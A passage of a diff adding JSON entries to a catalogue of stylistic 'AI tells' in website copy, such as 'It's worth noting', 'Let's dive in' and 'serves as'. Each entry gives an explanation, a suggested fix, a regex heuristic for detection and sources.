+  "oneLiner": "Comparison and 'which plan' pages end with 'Ultimately, the best choice depends on your needs.'",
+  "looksLike": "A '[Product] vs [Rival]' page or plan guide lists features for both sides, then concludes 'There's no one-size-fits-all solution' and 'Both options have their pros and cons.' The reader who came for a recommendation leaves without one.",
+  "why": "Models are tuned to avoid taking sides and to sound balanced, so the safest conclusion is a non-answer. Practitioner lists of AI tells name these overly safe conclusions.",
+  "who": "People at the decision stage do extra work or leave for a source that will tell them which to pick.",
+  "theFix": "End with a recommendation by case: 'Pick Pro if you have more than three editors; otherwise the free plan is enough.'",
+  "heur": "Regex final paragraphs for /\\b(depends on your (specific )?needs|no one-size-fits-all|both (options|tools) have their (pros|strengths))\\b/i.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Phrases That Instantly Make Writing Sound AI-Generated",
+    "u": "https://www.ultimatewb.com/blog/8275/phrases-that-instantly-make-writing-sound-ai-generated/"
+   }
+  ],
+  "code": "A130",
+  "rel": [
+   "zombie-domain-newsroom",
+   "summary-eats-the-source",
+   "prompted-expertise-loop"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "Copy editors list 'Ultimately, it depends on your needs' and 'There's no one-size-fits-all solution' as overly safe AI conclusions.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "it-s-worth-noting",
+  "name": "It's Worth Noting",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Support",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Help, FAQ and pricing copy prefaces plain facts with 'It's worth noting that' or 'It's important to note'.",
+  "looksLike": "'It's important to note that refunds take 5 to 7 days.' 'It's worth noting that the free plan has limits.' 'Importantly, your data is safe.' The scaffold delays the fact and makes routine information sound like a warning.",
+  "why": "Hedging scaffolds are common in academic training text and help a model sound careful. Practitioner lists of AI tells repeatedly name these phrases as filler in AI-written copy.",
+  "who": "People scanning help or pricing for a single fact read more words to get it, and real warnings lose force because everything is flagged as noteworthy.",
+  "theFix": "Delete the scaffold and state the fact. If something really is a warning, say what happens and when: 'Refunds reach your card 5 to 7 days after approval.'",
+  "heur": "Regex for /\\b(it'?s|it is) (worth noting|important to note|worth mentioning)|^importantly,|^notably,/i in help, FAQ and pricing copy.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "It's worth noting",
+    "u": "https://tropes.fyi/tropes/its-worth-noting"
+   },
+   {
+    "t": "Hedging preamble",
+    "u": "https://feedsquad.com/ai-tells/hedging-preamble"
+   },
+   {
+    "t": "How to Write Website Copy That Sounds Like You and Not Like AI.",
+    "u": "https://www.pravinkumar.co/blog/website-copy-authentic-voice-not-ai-2026"
+   }
+  ],
+  "code": "A131",
+  "rel": [
+   "built-with-love-footer",
+   "bold-label-bullets",
+   "arrows-and-curly-quotes"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "Copy editors and AI-tell directories list 'It's worth noting' and 'It's important to note' as filler that AI drafts add to plain statements; one catalogue marks the signal as contested.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "let-s-dive-in",
+  "name": "Let's Dive In",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Content",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "Guides and help articles announce what they will do: 'In this article, we'll explore...' 'Let's dive in.'",
+  "looksLike": "A help-centre page or blog post opens with 'In this guide, we will walk you through everything you need to know' and 'Let's break it down.' The first useful instruction is several lines down. Each section restarts with 'Let's explore...'.",
+  "why": "Models default to a teacher-to-student voice and to narrating structure, because tutorial and essay text in training does it. AI-tell directories list 'Let's dive in', 'Let's break this down' and 'In this article, we will' as stock phrases.",
+  "who": "Someone who came to the help page with a problem scrolls past throat-clearing before finding the step they need.",
+  "theFix": "Start with the answer or the first step. Tell the AI: 'No introductions, no announcements of what follows. Begin with the instruction.'",
+  "heur": "Regex for /\\b(let'?s (dive|break|explore|unpack)|in this (article|guide|post),? (we|you)('ll| will))\\b/i in the first 300 characters of content pages.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Let's break this down",
+    "u": "https://tropes.fyi/tropes/lets-break-this-down"
+   },
+   {
+    "t": "Structure announcement",
+    "u": "https://feedsquad.com/ai-tells/structure-announcement"
+   },
+   {
+    "t": "The Phrases That Give Away AI Writing (and How to Edit Them Out Before They Cost You Trust)",
+    "u": "https://www.ritnerdigital.com/blog/the-phrases-that-give-away-ai-writing-and-how-to-edit-them-out-before-they-cost-you-trust"
+   }
+  ],
+  "code": "A132",
+  "rel": [
+   "despite-these-challenges",
+   "the-evolving-landscape-opener",
+   "zombie-domain-newsroom"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "AI-tell catalogues and copy editors flag structure announcements and 'Let's dive in' as stock AI openers in guides and posts.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "nestled-in-the-heart-of",
+  "name": "Nestled In The Heart Of",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Content",
+  "harm": "Credibility",
+  "origin": "Training data",
+  "oneLiner": "Local business and travel sites written in travel-brochure clichés: 'Nestled in the heart of', 'vibrant', 'rich tapestry'.",
+  "looksLike": "A dentist, café or rental's site says it is 'nestled in the heart of downtown', 'offers a diverse array of services' and is 'a vibrant hub with a rich cultural heritage'. The same phrases appear on businesses in different cities and industries.",
+  "why": "Wikipedia editors note LLMs drift into advertisement or travel-guide prose even when asked for neutral text, listing 'nestled', 'in the heart of', 'vibrant', 'rich' and 'diverse array'. Jill Walker Rettberg describes these sensory promotional phrases as genre glitches pulled in by association.",
+  "who": "Local customers looking for hours, prices and parking get scenery, and the business sounds like every other AI-built site in town.",
+  "theFix": "Replace each cliché with a fact: the street, the nearest landmark, opening hours, what you actually do. Tell the AI: 'No travel-guide language. Facts only.'",
+  "heur": "Regex for /\\b(nestled|in the heart of|vibrant|rich (tapestry|heritage|history)|diverse array|hidden gem)\\b/i; flag 2+ per page.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   },
+   {
+    "t": "Genre glitches and unexpected promotional phrases as a sign of AI writing",
+    "u": "https://jilltxt.net/genre-glitches-and-unexpected-promotional-phrases-as-a-sign-of-ai-writing/"
+   }
+  ],
+  "code": "A133",
+  "rel": [
+   "scaled-search-slop",
+   "personalised-by-nobody",
+   "furniture-text"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "promo-voice-in-the-error",
+  "name": "Promo Voice In The Error",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Error-handling",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "Error messages, status updates and changelogs slip into sales language: 'Our robust platform experienced a brief interruption.'",
+  "looksLike": "An incident notice says 'Known for reliable performance, our platform briefly experienced degraded service.' An error page reassures you of the company's 'commitment to excellence'. A changelog entry for a bug fix 'elevates your experience'. What broke, when and what to do is missing.",
+  "why": "Models pull promotional phrases into neutral genres by association, a pattern Rettberg calls genre glitches and Wikipedia documents as promotional tone appearing even when not asked for. Product teams prompt one brand voice and it gets applied to every surface.",
+  "who": "Users in the middle of a failure get reassurance instead of the information they need, which reads as evasive.",
+  "theFix": "For errors and incidents, lead with what happened, the time, the impact and the next step. Keep brand adjectives out of error, status and changelog templates.",
+  "heur": "Regex error, status and changelog strings for marketing terms (robust, seamless, commitment to, elevate, world-class, reliable performance).",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Genre glitches and unexpected promotional phrases as a sign of AI writing",
+    "u": "https://jilltxt.net/genre-glitches-and-unexpected-promotional-phrases-as-a-sign-of-ai-writing/"
+   },
+   {
+    "t": "Promotional register in the wrong genre",
+    "u": "https://feedsquad.com/ai-tells/promotional-register-misplacement"
+   },
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   }
+  ],
+  "code": "A134",
+  "rel": [
+   "the-developer-facing-error-page",
+   "silent-success",
+   "everything-is-200"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "quietly-fundamentally",
+  "name": "Quietly, Fundamentally",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Adverbs like 'quietly', 'fundamentally', 'truly' and 'genuinely' are added to make ordinary features sound important.",
+  "looksLike": "'Quietly orchestrating your workflows in the background.' 'A tool that fundamentally reshapes how teams work.' 'Truly effortless.' 'Genuinely useful.' Delete the adverb and the claim is unchanged.",
+  "why": "Wikipedia's list of AI vocabulary shows the words shift with model generations, and names 'quietly', 'steady' and 'dependable' among those overused by mid-2026 models. AI-tell catalogues describe these as magic and emphatic adverbs that add importance or sincerity without information.",
+  "who": "Readers who have seen the 2026 register recognise it at once, and the copy reads as generated rather than meant.",
+  "theFix": "Delete the adverb. If the sentence feels weak without it, the claim needs a fact, not an intensifier.",
+  "heur": "Regex for /\\b(quietly|fundamentally|truly|genuinely|deeply|remarkably)\\b/i in marketing copy; flag 3+ per page.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   },
+   {
+    "t": "\"Quietly\" and Other Magic Adverbs",
+    "u": "https://tropes.fyi/tropes/quietly-adverb"
+   },
+   {
+    "t": "Emphatic adverbs",
+    "u": "https://feedsquad.com/ai-tells/emphatic-adverb-tic"
+   }
+  ],
+  "code": "A135",
+  "rel": [
+   "title-case-every-heading",
+   "furniture-text",
+   "serves-as-boasts"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "serves-as-boasts",
+  "name": "Serves As, Boasts",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Plain 'is' and 'has' are replaced with 'serves as', 'stands as', 'boasts' and 'features'.",
+  "looksLike": "'Our dashboard serves as your command center.' 'The app boasts a clean interface and features powerful integrations.' 'This page serves as a guide to our pricing.' Every simple statement of what something is or has gets a heavier, salesier verb.",
+  "why": "LLM text measurably avoids basic copulas: Wikipedia editors document GPT and Gemini output swapping 'is' for 'serves as' or 'marks', and 'has' for marketing verbs like 'features', 'offers' and 'boasts'. AI copyedits make the swap even when asked only to improve existing text.",
+  "who": "Readers parse a longer, vaguer sentence for the same claim, and the product sounds like a brochure instead of a tool.",
+  "theFix": "Use 'is' and 'has'. Then add the concrete fact: 'The dashboard shows open orders, late shipments and refunds on one screen.'",
+  "heur": "Regex for /\\b(serves|stands|functions|operates) as (a|an|the)\\b|\\bboasts (a|an)\\b/i in visible copy; flag 2+ per page.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   },
+   {
+    "t": "Copula avoidance (serves as, stands as, functions as)",
+    "u": "https://feedsquad.com/ai-tells/copula-avoidance-serves-as"
+   },
+   {
+    "t": "The \"Serves As\" dodge",
+    "u": "https://tropes.fyi/tropes/serves-as-dodge"
+   }
+  ],
+  "code": "A136",
+  "rel": [
+   "emoji-bullets",
+   "built-with-love-footer",
+   "bold-label-bullets"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "simple-and-intuitive",
+  "name": "Simple And Intuitive",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Features are described in pairs of near-synonyms: 'simple and intuitive', 'secure and reliable', 'fast and efficient'.",
+  "looksLike": "Every card has a doublet: 'Powerful and flexible.' 'Clarity and insight.' 'Smoother and more consistent.' The second word adds length, not meaning, and no testable claim follows.",
+  "why": "Reinhart and colleagues measured phrasal coordination in GPT-4o output at 1.9 times the human rate. Pairing near-synonyms is a low-risk way for a model to sound thorough.",
+  "who": "Prospects reading feature cards cannot tell what is actually different about this product.",
+  "theFix": "Delete one word of each pair. If nothing is lost, replace the remaining adjective with a fact: 'Set up in one command, no config file.'",
+  "heur": "Regex for /\\b(\\w+) and (\\w+)\\b/ where both are in an adjective list (simple, intuitive, secure, reliable, fast, efficient, powerful, flexible, seamless, scalable); flag 3+ per page.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Do LLMs write like humans? Variation in grammatical and rhetorical styles",
+    "u": "https://arxiv.org/abs/2410.16107"
+   },
+   {
+    "t": "Paired-phrase coordination",
+    "u": "https://feedsquad.com/ai-tells/phrasal-coordination-habit"
+   }
+  ],
+  "code": "A137",
+  "rel": [
+   "tricolon-everything",
+   "quietly-fundamentally",
+   "serves-as-boasts"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "testament-language",
+  "name": "Testament Language",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Ordinary facts about a company are declared 'a testament to' or 'a pivotal moment in' something bigger.",
+  "looksLike": "About pages and launch posts say the founding 'marked a pivotal moment', the team's growth 'is a testament to our commitment', and the product 'plays a vital role in shaping the future of work'. The sentence names a significance but never shows it. Swap in any other company and it still reads fine.",
+  "why": "Models are trained on text where notable subjects are described in important-sounding language, so they reach for the statistically safe verdict instead of a rare specific fact. Wikipedia editors list 'stands as', 'is a testament', 'pivotal role' and 'evolving landscape' as a distinct, recurring repertoire in LLM output.",
+  "who": "Readers looking for what the company actually did get a verdict instead of evidence, and the puffery makes the rest of the page feel unearned.",
+  "theFix": "Replace each verdict with the fact behind it: a number, a date, a named customer, a shipped thing. Tell the AI: 'Do not use testament, pivotal, crucial role or evolving landscape. State facts only.'",
+  "heur": "Regex visible text for /\\b(a testament to|pivotal (moment|role)|(crucial|vital|key) role|evolving landscape|indelible mark|marking a (significant|pivotal))\\b/i; flag 2+ hits per page.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   },
+   {
+    "t": "A testament to",
+    "u": "https://feedsquad.com/ai-tells/testament-formula"
+   }
+  ],
+  "code": "A138",
+  "rel": [
+   "leftover-lorem",
+   "quietly-fundamentally",
+   "the-any-company-paragraph"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-any-company-paragraph",
+  "name": "The Any-Company Paragraph",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Body copy so generic that swapping in a competitor's name changes nothing.",
+  "looksLike": "'Many businesses face challenges with managing their data. Our solution helps teams work smarter and achieve their goals.' The About and services pages name no customer, number, place or method. Every claim fits every company in the category.",
+  "why": "When a model has no real facts in its prompt it fills the slot with the most probable, widely applicable sentence. Wikipedia describes this as regression to the mean: specific facts smoothed into generic statements.",
+  "who": "Buyers comparing vendors cannot find a single reason to pick you, and search engines treat the page as low-value content.",
+  "theFix": "Run the substitution test: replace your name with a competitor's. If the paragraph survives, add one fact only you can state: a client, a figure, a process step, a date. Feed those facts to the AI instead of asking it to invent them.",
+  "heur": "Human review: replace the brand name with a competitor's; flag paragraphs that still read as true.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Specificity vacuum",
+    "u": "https://feedsquad.com/ai-tells/specificity-vacuum"
+   },
+   {
+    "t": "How to Write Website Copy That Sounds Like You and Not Like AI.",
+    "u": "https://www.pravinkumar.co/blog/website-copy-authentic-voice-not-ai-2026"
+   },
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   }
+  ],
+  "code": "A139",
+  "rel": [
+   "leftover-lorem",
+   "furniture-text",
+   "the-metronome-paragraph"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "Copy editors describe AI-drafted service pages as built from generic scenarios like 'Many businesses face challenges with...' and no specific anecdotes.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-ensuring-tail",
+  "name": "The Ensuring Tail",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Feature sentences end with a tacked-on '-ing' clause that claims a benefit: ', ensuring seamless collaboration.'",
+  "looksLike": "'Data syncs every five minutes, ensuring your team always stays aligned.' 'We encrypt everything, giving you peace of mind.' Every feature blurb finishes on a comma and a participle that restates the sentence as a benefit. Delete the tail and nothing is lost.",
+  "why": "Instruction-tuned models use present participial clauses far more than people: Reinhart and colleagues measured GPT-4o at 5.3 times the human rate. Wikipedia lists 'ensuring', 'highlighting', 'fostering' and 'enhancing' tails as superficial analysis, a way of implying significance without adding a fact.",
+  "who": "Scanners reading feature copy get the same vague benefit five times and still do not know what the feature does or what it costs them.",
+  "theFix": "Cut the trailing clause. If a real consequence was hiding in it, give it its own sentence with a number or a condition: 'Data syncs every five minutes. Edits made offline merge when you reconnect.'",
+  "heur": "Regex sentences for /,\\s+(ensuring|enabling|allowing|giving|helping|empowering|fostering|enhancing|making)\\s+\\w+/i at sentence end; flag when more than a third of feature-section sentences match.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Do LLMs write like humans? Variation in grammatical and rhetorical styles",
+    "u": "https://arxiv.org/abs/2410.16107"
+   },
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   },
+   {
+    "t": "Participial tack-on padding",
+    "u": "https://feedsquad.com/ai-tells/participial-tackon"
+   }
+  ],
+  "code": "A140",
+  "rel": [
+   "additionally-moreover",
+   "leftover-lorem",
+   "verb-cosplay"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-invented-framework",
+  "name": "The Invented Framework",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Marketing",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Agency and consultant sites present a newly coined, capitalised method as an established term.",
+  "looksLike": "'Our proprietary Clarity Loop.' 'We call it the Trust Gradient, a principle well known to practitioners.' 'Escape the complexity trap.' The label sounds analytical, has no source, and is never explained beyond the name.",
+  "why": "Models readily coin compound labels from a domain word plus a problem noun like trap, paradox, gap or creep, which reads as insight. AI-tell directories list these invented concept labels as a sign of AI prose.",
+  "who": "Clients think they are buying a tested method, and the vague label hides that no actual process is described.",
+  "theFix": "If the method is yours, say so and describe its steps with an example. If there are no steps, drop the name.",
+  "heur": "Human review: flag capitalised or quoted multi-word concept names that have no definition, steps or source on the page.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Invented concept labels - Tropes",
+    "u": "https://tropes.fyi/tropes/named-concept-abuse"
+   },
+   {
+    "t": "Invented concept labels",
+    "u": "https://feedsquad.com/ai-tells/invented-concept-label"
+   }
+  ],
+  "code": "A141",
+  "rel": [
+   "ai-washed-rules-engine",
+   "accuracy-number-nobody-tested",
+   "retouched-into-fiction"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "AI-tell directories report models coining labels like 'the acceleration trap' or 'workload creep' and presenting them as established concepts.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-marcus-chen-persona",
+  "name": "The Marcus Chen Persona",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Credibility",
+  "origin": "Training data",
+  "oneLiner": "Use-case stories, demo accounts and team pages reuse the same few model-default names, like Marcus Chen or Elara Voss.",
+  "looksLike": "A 'Meet Sarah' style use-case vignette, a demo dashboard user, a sample testimonial and a placeholder team member all carry names from the same small pool: Marcus Chen, Elena Vasquez, Kira Voss, Dr. Aris Thorne. The same names show up on unrelated AI-built sites.",
+  "why": "Asked to name a person, models converge on a few high-probability names. One test of Claude Sonnet 4.5 returned 'Marcus Chen' for a software developer in all 100 runs, and Max Read documented 'Elara Voss' recurring across models.",
+  "who": "Visitors who have seen the names before read the people as fake, which spreads doubt to real testimonials and case studies on the same page.",
+  "theFix": "Use real, consented names, or clearly fictional placeholders marked as examples. Never let the model name example users, customers or staff.",
+  "heur": "Search visible text and demo data for a list of known model-default names (Marcus Chen, Elena Vasquez, Kira Voss, Elara Voss, Aris Thorne).",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "AI Names",
+    "u": "https://www.seehuhn.de/blog/ai-names/"
+   },
+   {
+    "t": "Who is Elara Voss?",
+    "u": "https://maxread.substack.com/p/who-is-elara-voss"
+   }
+  ],
+  "code": "A142",
+  "rel": [
+   "title-case-every-heading",
+   "leftover-lorem",
+   "built-with-love-footer"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-metronome-paragraph",
+  "name": "The Metronome Paragraph",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Every sentence in a block is roughly the same length, so the copy has an even, mechanical rhythm.",
+  "looksLike": "Feature descriptions are three sentences of 12 to 16 words each. Paragraphs on the About page are all the same height. Read aloud, the copy ticks along at one speed with no short punch and no long explanation.",
+  "why": "Model output clusters sentence length in a narrow band, and practitioners describe AI web copy as having monotonously similar sentence and paragraph lengths. Detection researchers use this low variation as one signal, though it is contested on its own.",
+  "who": "Readers' attention drops on uniform text, so the one sentence that matters gets the same weight as filler.",
+  "theFix": "Read the copy aloud and vary it on purpose: let one sentence carry detail, and keep another to four words. Do not chase a burstiness score.",
+  "heur": "Compute the coefficient of variation of sentence word counts per section; flag sections below about 0.3 for a read-aloud review, not as proof.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Uniform sentence cadence",
+    "u": "https://feedsquad.com/ai-tells/sentence-cadence-uniformity"
+   },
+   {
+    "t": "How to Write Website Copy That Sounds Like You and Not Like AI.",
+    "u": "https://www.pravinkumar.co/blog/website-copy-authentic-voice-not-ai-2026"
+   },
+   {
+    "t": "Is AI Writing Your LinkedIn Hurting You? The 2026 AI-Slop Backlash",
+    "u": "https://www.hiration.com/blog/ai-slop-linkedin/"
+   }
+  ],
+  "code": "A143",
+  "rel": [
+   "em-dash-cadence",
+   "same-words-twice",
+   "bold-label-bullets"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "Copywriters and AI-tell catalogues describe AI web copy as having near-identical sentence and paragraph lengths; one catalogue notes the measure is contested.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-mic-drop-closer",
+  "name": "The Mic-Drop Closer",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Each section ends on a standalone one-liner built to land: 'That's the power of X.'",
+  "looksLike": "After a paragraph of features comes a short final line on its own: 'The future of work is here.' 'Simple as that.' 'It just works.' The line could close any section of any site, and deleting it loses nothing.",
+  "why": "Models are tuned toward copy that feels finished, and a short declarative closer is the cheapest way to signal an ending. Practitioners writing about AI copy name 'short, declarative closing sentences' as a core tell.",
+  "who": "Readers who notice the pattern start skimming past the last line of every block, including the ones with real information.",
+  "theFix": "Delete the closer, or replace it with a sentence that names something specific from the section: a number, a next step, a limit.",
+  "heur": "Human review: flag section-final paragraphs of one sentence under 8 words that share no noun with the section body.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Mic-drop closer",
+    "u": "https://feedsquad.com/ai-tells/mic-drop-closer"
+   },
+   {
+    "t": "I've spent a decade teaching AI to write. Here's why your slop posts are ruining your LinkedIn",
+    "u": "https://fortune.com/2026/10/06/ai-slop-marketing-ghostwriter-copy/"
+   },
+   {
+    "t": "tbhb/vale-ai-tells",
+    "u": "https://github.com/tbhb/vale-ai-tells"
+   }
+  ],
+  "code": "A144",
+  "rel": [
+   "built-with-love-footer",
+   "the-weightless-headline",
+   "the-invented-stat-row"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "AI-tell catalogues and a 2026 Fortune op-ed by an AI copywriting CEO single out short, declarative closing lines as a giveaway of AI copy.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-result-reveal",
+  "name": "The Result? Reveal",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Copy asks itself a question and answers it at once: 'The result? 10x faster deploys.'",
+  "looksLike": "'The best part? It's free.' 'The catch? There isn't one.' 'The result? Happier teams.' A fragment question sets up a reveal that the next two words deliver, several times down the page.",
+  "why": "The ask-and-answer mold is a cheap way for a model to add drama and rhythm. AI-tell directories list 'The X? A Y.' as a recurring pattern, and AI copywriters name rhetorical question openers as a tell, though one catalogue notes LLMs use fewer questions overall.",
+  "who": "Readers who spot the device skim the reveals, including the one that carries your real offer.",
+  "theFix": "Turn the pair into one plain sentence: 'Deploys take 40 seconds instead of 7 minutes.' Keep a question only when a reader would really ask it.",
+  "heur": "Regex for /\\bThe (result|best part|catch|kicker|secret|twist)\\?\\s/ in visible copy; flag 2+ per page.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "\"The X? A Y.\"",
+    "u": "https://tropes.fyi/tropes/rhetorical-qa"
+   },
+   {
+    "t": "I've spent a decade teaching AI to write. Here's why your slop posts are ruining your LinkedIn",
+    "u": "https://fortune.com/2026/10/06/ai-slop-marketing-ghostwriter-copy/"
+   },
+   {
+    "t": "Rhetorical question that answers itself",
+    "u": "https://feedsquad.com/ai-tells/self-answering-question-opener"
+   }
+  ],
+  "code": "A145",
+  "rel": [
+   "the-weightless-headline",
+   "additionally-moreover",
+   "arrows-and-curly-quotes"
+  ],
+  "tier": "practitioner-observed",
+  "observed": "AI-tell directories and a 2026 Fortune op-ed by an AI copywriting CEO flag self-answered rhetorical questions as a stock AI device; FeedSquad marks the wider signal as contested.",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-synonym-carousel",
+  "name": "The Synonym Carousel",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "One product is called 'the platform', 'the tool', 'the solution' and 'the hub' in consecutive sentences.",
+  "looksLike": "A features page says 'the dashboard' in one line, 'the interface' in the next, then 'the portal' and 'the analytics hub'. Help text alternates 'workspace', 'project' and 'space' for the same object. Readers start wondering whether these are four different things.",
+  "why": "Repetition penalties in decoding push models away from reusing a word they have already produced, so the referent gets rotated. Wikipedia and the Tropes directory both list this synonym cycling as a recurring LLM habit.",
+  "who": "New users cannot tell which noun is the real name of the thing they are looking for in the menu, which slows onboarding and creates support tickets.",
+  "theFix": "Pick one name per object and use it everywhere: page copy, UI labels, docs. Give the AI a glossary and say 'Always call this X. Never use synonyms for product objects.'",
+  "heur": "Human review: list every noun used for the main product object across the page; flag 3+ different names with no difference in meaning.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Wikipedia:Signs of AI writing",
+    "u": "https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing"
+   },
+   {
+    "t": "Elegant variation",
+    "u": "https://feedsquad.com/ai-tells/elegant-variation"
+   },
+   {
+    "t": "Synonym cycling - Tropes",
+    "u": "https://tropes.fyi/tropes/synonym-cycling"
+   }
+  ],
+  "code": "A146",
+  "rel": [
+   "the-weightless-headline",
+   "the-invented-stat-row",
+   "placeholder-testimonials"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "think-of-it-as",
+  "name": "Think Of It As",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Copy",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "The product is explained by a one-line analogy before, or instead of, saying what it does.",
+  "looksLike": "'Think of it as a Swiss Army knife for your codebase.' 'Imagine a personal assistant in your pocket.' 'Like a nervous system for your operations.' The analogy is never extended, and the mechanism is never stated.",
+  "why": "Stock analogies are a common explanatory move in tutorial text, and models reach for them by default. AI-tell catalogues and lint rules flag 'think of it as' openers in AI prose.",
+  "who": "Visitors learn what the product feels like, not what it does, so they cannot judge whether it fits their problem.",
+  "theFix": "State the mechanism first: what goes in, what happens, what comes out. Keep an analogy only if you carry it through and say where it breaks.",
+  "heur": "Regex for /\\b(think of it (as|like)|imagine it as|picture it as)\\b/i in hero and feature copy.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "\"Think of it as...\"",
